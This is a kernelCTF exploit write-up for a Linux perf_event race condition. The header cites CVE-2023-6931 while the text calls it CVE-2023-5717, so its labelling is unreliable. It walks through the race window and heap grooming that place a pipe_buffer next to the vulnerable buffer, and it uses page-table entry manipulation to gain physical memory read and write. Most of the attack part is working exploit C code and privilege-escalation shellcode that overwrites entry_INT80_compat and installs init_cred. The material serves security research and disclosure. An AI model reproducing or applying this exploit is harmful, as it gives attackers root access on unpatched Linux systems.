# CVE-2023-6931

## Exploit Details

Exploit demo for CVE-2023-5717. Flag: `kernelCTF{v1:mitigation-v3b-6.1.55:1732857935:6261f8f865bfa74724bdfdf5002d01c644f70ff6}`

## Overview

This vulnerability enables an out-of-bounds increment when a race condition is successfully triggered.
On hardened systems, mitigations such as CONFIG_KMALLOC_SPLIT_VARSIZE increase exploitation complexity.
To circumvent these defenses, I manipulated the buddy allocator to achieve controlled linear heap allocation.

The diagram represents the hierarchy of perf_event groups when a process creates an event group and then forks a child process.
1) Parent group (Initial state)
- At the top, we have a group_leader, which is the leader of the parent event group.
- The group_leader manages multiple sibling events, which are linked together.
```
+-----------------+         +------------+
| group_leader    |---------| sibling 1  |  <--- Siblings connected to group_leader
+-----------------+         +------------+
```
2) Child group (After forking)
- When the process forks a child process, the event group is inherited by the child.
- This creates a child event group, which consists of new events mirroring the parent group's structure.
- The child event group also has a new group leader, which is the event corresponding to group_leader in the child process.
```
+-----------------+         +------------+
| group_leader    |---------| sibling 1  |  <--- Siblings connected to group_leader
+-----------------+         +------------+
    |                           |      
+-----------+             +-----------+
| child 1   |-------------| child 2   |  <--- Children connected to each parent & child group leader
+-----------+             +-----------+
```

Following diagram represents the overall structure.
```
+----------------+   +-------+   +---------+
| Parent Process |---| CTX A |---| Group A |
+----------------+   +-------+   +---------+
    |                                 
+---------------+   +--------+   +----------+
| Child Process |---| CTX A' |---| Group A' | <--- Inherited child group
+---------------+   +--------+   +----------+
```
Each CTX is responsible for controlling and managing its event group. For example, before accessing Group A, CTX A locks this group to prevent race conditions.

## Race scenario
### CPU0
```c
perf_read()
  ctx = perf_event_ctx_lock(event);
  - perf_read_group()
      values = kzalloc(event->read_size, GFP_KERNEL); // [A]
      mutex_lock(&leader->child_mutex);  // [B]
      ret = __perf_read_group_add(leader, read_format, values);
      list_for_each_entry(child, &leader->child_list, child_list) {
        ret = __perf_read_group_add(child, read_format, values);
      }
      mutex_unlock(&leader->child_mutex);      
  perf_event_ctx_unlock(event, ctx);
```
### CPU1
```c
perf_release()
  ctx = perf_event_ctx_lock(event);
  perf_remove_from_context(event, DETACH_GROUP|DETACH_DEAD); // [C]
  perf_event_ctx_unlock(event, ctx); // [D]
  mutex_lock(&event->child_mutex);  // [E]
  list_for_each_entry(child, &event->child_list, child_list) {
    perf_remove_from_context(child, DETACH_GROUP);
  }
```
### Description
If execution follows the sequence C -> D -> A -> B -> E, the vulnerability is triggered as follows:
1) At C, the parent event is removed from its parent group, decrementing `group_leader->nr_siblings`, which represents the parent group's size.
2) At A, `values` is allocated based on the value of `group_leader->nr_siblings`, which has now been reduced.
3) At B, CPU 0 locks child_mutex, preventing CPU 1 from proceeding beyond E.
4) At E, CPU 1 attempts to iterate through `event->child_list`, but it is blocked because CPU 0 holds the lock at B.
5) Since the parent group's `child_list` is smaller than the child group's `child_list`, this leads to an out-of-bounds access on the heap, causing heap out-of-bounds.

## Allocating Buffers via the Buddy Allocator
In `perf_read_group()`, the allocated buffer size is determined by the number of active events.
The `perf_event_open()` system call enforces a restriction that new events must belong to the same task as the group leader:
```c
SYSCALL_DEFINE5(perf_event_open,
		struct perf_event_attr __user *, attr_uptr,
		pid_t, pid, int, cpu, int, group_fd, unsigned long, flags)
{
    [...]
    if (pid != -1 && !(flags & PERF_FLAG_PID_CGROUP)) {
		task = find_lively_task_by_vpid(pid);
		if (IS_ERR(task)) {
			err = PTR_ERR(task);
			goto err_group_fd;
		}
	}
    [...]
    event = perf_event_alloc(&attr, cpu, task, group_leader, NULL,
				 NULL, NULL, cgroup_fd);
    [...]
    ctx = find_get_context(pmu, task, event);
	if (IS_ERR(ctx)) {
		err = PTR_ERR(ctx);
		goto err_alloc;
	}

	/*
	 * Look up the group leader (we will attach this event to it):
	 */
	if (group_leader) {
        [...]
        /*
		 * Make sure we're both on the same task, or both
		 * per-CPU events.
		 */
		if (group_leader->ctx->task != ctx->task)
			goto err_context;
        [...]
    }
    [...]
}
```
The check:
```c
if (group_leader->ctx->task != ctx->task)
    goto err_context
```
ensures that group_leader and the new event belong to the same task.

Once an event is created, a new file descriptor is assigned to it.
While the default limit for the number of open file descriptors is 1024, this becomes a constraint since my exploit involves the allocating a lot of events. Fortunately, I can adjust this limit slightly. 
A function named `setup_max_fd_limit()` in my exploit is responsible for adjusting this limit.

## Gaining 8-byte Out-of-Bounds Arbitrary Increment primitive.
### Extending the race window
To extend the race window, I adapted some code from [CVE-2023-4622 Write-Up](https://github.com/google/security-research/blob/master/pocs/linux/kernelctf/CVE-2023-4622_lts/docs/exploit.md).

```c
void race(int group_leader) { // caller must have ownership of the event group
    [...]
    pid_t child_pid = fork();
    if (child_pid == 0) {  
        [...]
        for (int _=0; _<32; _++) {
            read(group_leader, event_buf, sizeof(event_buf));
        }
        [...]
    }
    else if (child_pid > 0) { // parent
        [...]
        struct itimerspec new = {.it_value.tv_nsec = r};
        timerfd_settime(tfd, TFD_TIMER_CANCEL_ON_SET, &new, NULL);
        close(siblings[100]);
        [...]
}
```

### Bypassing context swap optimization
An exploit for mitigation instance with over 70% reliability is eligible. 
At first I didn't care about context swap optimization, but the reliability of my exploit was about 10~20% and it took about 3~4hrs to run.
Since my exploit is for mitigation instance, it was not eligible.

The function `perf_event_context_sched_out()` is invoked by the task scheduler during context switches:
```c
static void perf_event_context_sched_out(struct task_struct *task, int ctxn,
                                         struct task_struct *next)
{
  [...]
		if (context_equiv(ctx, next_ctx)) {
      [...]
			WRITE_ONCE(ctx->task, next);
			WRITE_ONCE(next_ctx->task, task);
            [...]
			RCU_INIT_POINTER(task->perf_event_ctxp[ctxn], next_ctx);
			RCU_INIT_POINTER(next->perf_event_ctxp[ctxn], ctx);

			do_switch = 0;

			perf_event_sync_stat(ctx, next_ctx);
		}
  [...]
}
```
This function swaps ctx between two tasks under the following conditions:
```
- child task -> parent task 
- parent task -> child task 
- child task -> child task 
```
Crucially, both tasks must belong to the same group, and their group composition must be identical. 
Because the scheduler's behavior is almost impossible to predict, I needed to find a way to work around this limitation.
Specifically, this swap optimization can be circumvented through techniques like CPU core pinning to fix process execution locations, or by intentionally altering group compositions to make such optimizations impossible to implement effectively.
The following code demonstrates these implementation strategies:
```c
void race(int group_leader) { // caller must have ownership of the event group
    [...]
    else if (child_pid > 0) { // parent

        race_layout_index += 2;
        int tmp = perf_event_open(&pe, 0, CPU_A, -1, 0); 
        close(tmp);
        // this code seems useless but, this ensure that the process's ctx is no longer get swapped by scheduler.
        // it's very important because the ownership of the group can be destroyed while child process exits.
        // we have to keep the ownership away from being destroyed.
        usleep(20000);
        kill(child_pid, SIGCONT); // now we pinned the ownership. now child process is allowed to exit.
    [...]
    }
}
```
### race overview
After calling `setup_events()`, some child processes are created.
```c
if (is_racer) {
    struct sigaction sa;
    sa.sa_handler = race_trigger;
    sigemptyset(&sa.sa_mask);
    sa.sa_flags = 0;
    if (sigaction(SIGUSR1, &sa, NULL) < 0) {
        perror("sigaction");
        exit(EXIT_FAILURE);
    }
}
[...]
    if (is_racer) {
        _pin_to_cpu(CPU_B);
        sched_yield();
        // child will be running on CPU_A
        spray_xattr_page(0x4008, 4, 1); // 16392
        remove_xattr("security.x16392_0", 1);
        remove_xattr("security.x16392_1", 1);
        remove_xattr("security.x16392_2", 1);
        remove_xattr("security.x16392_3", 1);
        remove_xattr("security.x12296_5", 1);
        remove_xattr("security.x12296_6", 1);
        sched_yield();

    for (int _; _<TRY_PER_ITER; _++) {
        while (!atomic_load(&race_trigger_flag)); // wait for signal
        race(group_leader);
    }
[...]
```
For the 'racer' process, a signal handler is registered to call the `race()` function.

To achieve a reliable race condition, we must minimize execution latency and ensure that the racing thread enters the kernel-side vulnerable path at a precise moment. We utilize a signal-driven trigger combined with atomic flags for the following reasons:

- Latency Reduction: Unlike a standard busy-wait loop, which is susceptible to scheduling jitters and higher CPU overhead, a signal handler (`race_trigger`) allows the thread to react asynchronously with minimal delay.

- Memory Visibility: By using `atomic_int` for `race_trigger_flag`, we ensure strict memory ordering and visibility across multiple CPU cores without the heavy overhead of mutexes. This allows the racing thread to detect the trigger instantly, hitting the narrow race window consistently.

The exploit attempts to trigger the race condition multiple times to ensure success. During these attempts, there is a possibility that a 0x4008 sized buffer is allocated instead of the targeted 0x4000 buffer (a "failed" race).

- Predictable Layout for Retries: To maintain a deterministic heap environment across these multiple attempts, we pre-allocate and free 0x4008 buffers. This ensures that even when a race fails and a 0x4008 object is allocated, it reclaims a predictable slot in the kmalloc-32k slab rather than causing random fragmentation.

- Stability: By "reserving" and then "reclaiming" the area for both the success scenario (kmalloc-16k) and the failure scenario (kmalloc-32k), we prevent the heap from becoming unstable during repeated race attempts, which significantly improves the overall reliability of the exploit on hardened targets.

In the `exploit()` function, the child process sends `SIGUSR1` to the racer. The `race_trigger` handler then updates the `race_trigger_flag` atomically, allowing the `race()` function to proceed with minimal scheduling delay.

```c
void race_trigger(int signo) { // signal handler
    atomic_store(&race_trigger_flag, 1);
}
```
The signal handler is invoked as follows:
```c
void exploit() {
    [...]
    pid_t pid = fork();
        if (pid == 0) {
            [...]
            int ppid = getppid();
            kill(siblings_fork_pid[0], SIGCONT); 
            for (int it=0; it<TRY_PER_ITER; it++) {
                printf("[*] Iter %d\n", it);
                kill(siblings_fork_pid[0], SIGUSR1); // trigger race()
                while (atomic_load(&race_notify_flag) == 0);
                atomic_store(&race_notify_flag, 0);
                kill(ppid, SIGUSR1); // notify parent
                // if we call mprotect in child process, permission bits will be modified
                // so we have to check whether the ptes in "Parent process" are pointing Physical address "0x0"
                raise(SIGSTOP); // sync point B
                // wait for parent process to checkout the ptes.
            }
        [...]
        else if(pid > 0) {
            for (int it=0; it<TRY_PER_ITER; it++) {
                while (atomic_load(&race_notify_flag) == 0);
                atomic_store(&race_notify_flag, 0);
                mprotect(&spray_addr[0][0], MAP_SIZE, PROT_READ);
                mprotect(&spray_addr[0][0], MAP_SIZE, PROT_READ | PROT_WRITE | PROT_EXEC); 
                mprotect(&spray_addr[1][0], MAP_SIZE, PROT_READ);
                mprotect(&spray_addr[1][0], MAP_SIZE, PROT_READ | PROT_WRITE | PROT_EXEC);
                for (int i=0; i<2; i++) {
                    for (int j=0; j<MAP_SIZE; j+=0x1000) {
                        if (*(uint64_t *)&spray_addr[i][j] == 0xf000ff53f000ff53ULL) { //race successful
    [...]
```
Inside `exploit()`, a child process is forked. This child process sends `SIGUSR1` to the dedicated 'racer' process, which triggers the `race_trigger()` handler and unblocks the `race()` function.
```c
void race(int group_leader) {
    [...]
    if (child_pid == 0) {
        [...] // race trigger - child
    }
    else if (child_pid > 0) {
        [...] // race 
    }
    [...]
    atomic_store(&race_trigger_flag, 0); // set the flag to 0 so that the child can wait for SIGUSR1 signal from parent.
    kill(ppid, SIGUSR1); // notify parent that the execution of race() is done
}
```
After the `race()` function completes, it resets `race_trigger_flag` to zero. This allows the 'racer' process to wait for the next `SIGUSR1` signal. It then sends `SIGUSR1` to its parent process (ppid) to notify it that the `race()` attempt is finished.
```c
void race_notify(int signo) { // signal handler
    atomic_store(&race_notify_flag, 1);
}

void initialize_race_notifiy(){
    struct sigaction sa;
    sa.sa_handler = race_notify;
    sigemptyset(&sa.sa_mask);
    sa.sa_flags = 0;
    if (sigaction(SIGUSR1, &sa, NULL) < 0) {
        perror("initialize_race_notify() - sigaction()");
        exit(EXIT_FAILURE);
    }
}
```
The `initialize_race_notifiy` function registers a handler that sets `race_notify_flag` to one upon receiving `SIGUSR1`. This mechanism is used by both the exploit parent and child processes for synchronization.

Inside the exploit child process, after its `race_notify_flag` is set (signaling that `race()` has finished), it resets the flag, notifies its own parent (the exploit parent) using `SIGUSR1`, and then stops.

Finally, the exploit parent process, upon receiving its notification (via its own `race_notify_flag`), performs mprotect operations and checks the sprayed memory locations to determine if the race condition was successful.

### Arbitrary increment and Heap Grooming
The goal is to create a discrepancy where the Child's sibling list contains N+1 events, while the Parent's buffer is sized for only N events. This leads to a precise 8-byte out-of-bounds (OOB) increment on an adjacent object.

The vulnerability is triggered within `__perf_read_group_add`. When the race is successful, the function iterates through the Child's extended sibling list while writing into the Parent's `values` buffer.
```c
static void __perf_read_group_add(struct perf_event *leader,
					u64 read_format, u64 *values)
{
	[...]
	list_for_each_entry(sub, &leader->sibling_list, group_entry) {
        /*
        If the list belongs to the Child (N+1) but 'values' is sized for the Parent (N),
           the final iteration (N+1) will write 8 bytes out-of-bounds. */
        */
		values[n++] += perf_event_count(sub); // Increments target with child's pagefault counts
		if (read_format & PERF_FORMAT_ID)
			values[n++] = primary_event_id(sub);
	}
}
```
Because `values` is a `u64`, each increment of the index n moves the write position by exactly 8 bytes.
- The Parent's allocation covers offsets 0x0000 to 0x3fff (0x4000 sized buffer in parent context).
- When the loop iterates for the Child's (N+1)th event, the index n points to offset 0x4000, which is the start of the adjacent pipe_buffer (0x4008 sized buffer expected in child context).
- The operation `values[n++] += perf_event_count(sub)` performs an addition directly on the page pointer of the pipe_buffer. By controlling the number of page faults (`perf_event_count`) in the Child, we can precisely redirect this pointer to a target physical page.

To ensure the 8-byte OOB increment reliably hits the target `pipe_buffer`, we perform precise heap grooming within the kmalloc-16k slab cache:
- Sequential Allocation: We use `race_layout_index` to manage a series of sequential xattr allocations. This creates a predictable baseline in the kernel heap.
- Target Adjacency: We intentionally free a buffer at a specific index (N) and another at the subsequent index (N+1).
    - Buffer N (Vulnerable): This slot is freed and later reclaimed by the Parent's values buffer (0x4000 bytes) during the `read()` system call.
    - Buffer N+1 (Target): This slot is freed and immediately reclaimed by a pipe_buffer using `resize_pipe()`.

- Deterministic Reclaim: By freeing these buffers and immediately triggering the allocations for the exploit, we ensure that the `pipe_buffer` is placed directly after the vulnerable 0x4000 buffer.

- The Overwrite Path: When the race condition is triggered, the kernel attempts to write the Child's N+1 event data into the Parent's slot at index N. The resulting 8-byte overflow precisely targets the first 8 bytes of the pipe_buffer at index N+1, which is the page pointer.

Below is the core implementation of the exploit, demonstrating the heap grooming and the race condition:
```c
int race_layout_index = 0; // Index for sequential allocations to create a reliable memory layout during race condition exploitation
void race(int group_leader) { // caller must have ownership of the event group
    [...]
    pid_t child_pid = fork();
    if (child_pid == 0) {  
        _pin_to_cpu(CPU_A);
        sched_yield();

        raise(SIGSTOP); // STOP -> keep parent and child ctx's generation same.
        [...]
        if (close(siblings[100]) < 0) { 
            perror("close failed");
            exit(EXIT_FAILURE);
        }   
        [...]
        // Pagefault 0x80 times (PAGE_FAULT_COUNT)
        uint64_t pte = 0x8000000000000067;

        // this operation ensures that the pipe only uses the first element of the buffer array.
        [...]
        sprintf(xattr_name, "security.x12296_%d", race_layout_index + 1 + 16);
        remove_xattr(xattr_name, 1);
        resize_pipe(vuln_pipe[1], 0x1000 * 220);
        sprintf(xattr_name, "security.x12296_%d", race_layout_index + 16);
        sched_yield();
        write(pipefd[1], race_sync_buf, 1); // sync point A

        remove_xattr(xattr_name, 1); // free 0x4000 sized buffer
        for (int _=0; _<32; _++) {
            read(group_leader, event_buf, sizeof(event_buf));
        } // if the race is successful, we can write 0x4008 bytes to 0x4000 sized buffer. (To be more spec, we can increment the last 8bytes by 0x80(PAGE_FAULT_COUNT))
        write(vuln_pipe[1], &pte, sizeof(pte));  // After increasing the page pointer by 0x80, write the PTE(0x8000000000000067). 
        munmap(page_fault_memory, 0x1000 * 0x80); // Once the race is confirmed, we call lpe().

        exit(0);
    }
    else if (child_pid > 0) { // parent

        race_layout_index += 2;
        int tmp = perf_event_open(&pe, 0, CPU_A, -1, 0); 
        close(tmp);
        // this code seems useless but, this ensure that the process's ctx is no longer get swapped by scheduler.
        // it's very important because the ownership of the group can be destroyed while child process exits.
        // we have to keep the ownership away from being destroyed.
        usleep(20000);
        kill(child_pid, SIGCONT); // now we pinned the ownership. now child process is allowed to exit.

        read(pipefd[0], race_sync_buf, 1); // sync point A
		int r = MIN + rand() % (MAX - MIN + 1);
        printf("[*] r = %d\n", r);
        struct itimerspec new = {.it_value.tv_nsec = r};
        timerfd_settime(tfd, TFD_TIMER_CANCEL_ON_SET, &new, NULL);
        close(siblings[100]);

        tmp = perf_event_open(&pe, owner_pid, CPU_A, group_leader, 0);
        if (tmp < 0) {
            perror("Adding failed");
            exit(1);
        }
        siblings[100] = tmp; 
    } else {
        perror("fork failed");
        exit(EXIT_FAILURE);
    }
    waitpid(child_pid, &status, 0);

    close(pipefd[0]);
    close(pipefd[1]);
    atomic_store(&race_trigger_flag, 0); // set the flag to 0 so that the child can wait for SIGUSR1 signal from parent.
    kill(ppid, SIGUSR1); // notify parent that the execution of race() is done
}
```

## Arbitrary physical address Read/Write
1) Spraying User PTEs Near pipe_buffer
- First, we allocate a pipe_buffer and then allocate user pages.
- By repeatedly accessing these user pages, we spray user page table entries (PTEs) close to the pipe_buffer in memory.

2) Triggering the Vulnerability to Increment `pipe_buffer->page`
- We trigger the vulnerability to increment `pipe_buffer->page`, effectively making it point to the user PTEs.
- If the race condition is successful, we gain control over user PTEs and modify them as needed.

3) Patching the `entry_INT80_compat`
- Once we gain arbitrary memory read/write, we search for the `entry_INT80_compat` and overwrite it with following shellcode.
```c
    swapgs
    mov r12, QWORD PTR gs:0x20cc0 // gs:0x20cc0 points to the 'current_task' per-CPU variable on x86_64.
    mov r14, [r12+0x248] 
    sub r14, 0x1ec030   // r14 = kbase
    mov r8, r14 
        
    mov rdi, 1 
    mov rax, r8 
    add rax, 0x1bde50  // kbase(rax) + 0x1bde50(find_task_by_vpid offset)

    push r12
    push r8
    call rax     // find_task_by_vpid(1)
    mov rbx, rax
    pop r8
    pop r12

    mov rax, r8 
    add rax, 0x2a76900    // kbase(rax) + 0x2a76900(init_nsproxy)
    mov rdi, rax
    mov [rbx+2104], rdi    // find_task_by_vpid(1)->ns_proxy = init_nsproxy
    mov [r12+2104], rdi    // current->ns_proxy = init_nsproxy

    mov rax, r8 
    add rax, 0x2a76b40    // kbase(rax) + 0x2a76b40(init_cred offset)
    mov rdi, rax
    mov [r12 + 2008], rdi   // current->cred = init_cred
    swapgs 
    iretq
```